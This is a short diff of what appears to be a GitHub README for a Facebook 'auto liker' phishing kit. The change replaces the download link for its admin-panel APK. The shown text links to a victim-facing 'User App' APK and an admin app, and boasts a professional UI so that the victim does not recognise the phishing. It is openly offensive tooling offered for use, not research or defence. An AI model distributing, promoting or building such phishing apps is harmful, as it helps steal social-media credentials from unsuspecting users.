@@ -12,7 +12,7 @@ EX Auto Liker Phishing is a type of social engineering attack that is often used
 <a href="https://m.facebook.com/teamex2k22/">Team Ex</a>
 ## Download 
 <a href="https://raw.githubusercontent.com/Teamex07/Ex-Auto-Liker-Phising-/main/Facebook_auto_liker_(final)_base.apk">User App</a><br></br>
-<a href="https://raw.githubusercontent.com/Teamex07/Ff-Phishing-/main/FF%20PHISING%20ADMIN%20PANEL.apk">Admin App</a>
+<a href="https://raw.githubusercontent.com/Teamex07/Ex-Auto-Liker-Phising-/main/Auto_liker_Admin_base.apk">Admin App</a>
 ## Features
 * Professional Ui (Victim Don't Understand This Phishing)
 
